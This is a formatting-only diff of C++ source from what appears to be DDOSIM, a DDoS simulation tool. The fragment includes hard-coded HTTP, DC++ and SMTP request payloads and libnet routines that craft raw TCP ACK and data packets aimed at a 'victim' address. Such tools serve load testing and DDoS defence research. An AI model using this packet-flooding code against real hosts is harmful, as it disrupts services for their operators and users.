@@ -8,13 +8,11 @@ u_char *payload1 = (u_char*)
 Host: hostname\r\n\
 User-Agent: DDOSIM\r\n\r\n";
 
-
 u_char *payload2 = (u_char*)
 "$MyNick ddosim|$Lock";
 
 u_char *payload3 = (u_char*)
 "EHLO ddosim";
-
 
 list<Pkt> pktsToSend; 					//first send these packets
 map<string, ConnInfo> connsInited;		//info about initiated connections
@@ -23,11 +21,9 @@ pthread_mutex_t connMutex = PTHREAD_MUTEX_INITIALIZER; //mutual exclusion when a
 pthread_mutex_t countMutex = PTHREAD_MUTEX_INITIALIZER; //mutual exclusion when modifying synNo,rstNo and finNo
 pthread_mutex_t ackMutex = PTHREAD_MUTEX_INITIALIZER; //mutual exclusion when accessing pktsToSend (ACKs)
 
-void sendAck(u_char *packet, int packet_size, int network, 
-			int v, string victimIpStr, int requestType);
+void sendAck(u_char *packet, int packet_size, int network, int v, string victimIpStr, int requestType);
 void sendRequest(Pkt pkt, int network, int type, int v);
 int getNumConnsEstab();
-
 
 // This thread sends SYN packets to initiate TCP connsInited
 // and store the information about them into connsInited map
@@ -161,6 +157,7 @@ void* senderThread(void *arg)
 			usleep(100);
 		}
 	}
+
 	//Cleanup
     if (libnet_close_raw_sock(network) == -1)
     {
@@ -190,11 +187,7 @@ void sendAck(u_char *packet, int packet_size, int network,
 	Pkt pkt = pktsToSend.front();
 	pktsToSend.pop_front();
 
-	//TcpUtils::buildACK(packet, pkt.srcIp, pkt.dstIp, pkt.srcPort, pkt.dstPort, pkt.seqn, pkt.ackn);
-	TcpUtils::buildACK(packet, 
-				pkt.srcIp, pkt.dstIp, 
-				pkt.srcPort, pkt.dstPort, 
-				pkt.seqn, pkt.ackn);
+	TcpUtils::buildACK(packet, pkt.srcIp, pkt.dstIp, pkt.srcPort, pkt.dstPort, pkt.seqn, pkt.ackn);
 
     if (libnet_write_ip(network, packet, packet_size) < packet_size) {
 		libnet_error(LN_ERR_WARNING, (char*)"libnet_write_ip only wrote less then %d bytes\n", packet_size);
@@ -236,11 +229,7 @@ void sendRequest(Pkt pkt, int network, int type, int v)
 	int dataPackSize = LIBNET_IP_H + LIBNET_TCP_H + strlen((char *)payload);
 	libnet_init_packet(dataPackSize, &dataPacket);
 	if (dataPacket != NULL) {
-		TcpUtils::buildTcpData(dataPacket, 
-					pkt.srcIp, pkt.dstIp,
-					pkt.srcPort, pkt.dstPort, 
-					pkt.seqn, pkt.ackn, 
-					payload);
+		TcpUtils::buildTcpData(dataPacket, pkt.srcIp, pkt.dstIp, pkt.srcPort, pkt.dstPort, pkt.seqn, pkt.ackn, payload);
 		if (libnet_write_ip(network, dataPacket, dataPackSize) < dataPackSize) {
   			libnet_error(LN_ERR_WARNING, (char*)"libnet_write_ip only wrote less then %d bytes\n", dataPackSize);
 		}
@@ -260,8 +249,4 @@ int getNumConnsEstab()
 
 	return num;
 }
-
-
-
-
 
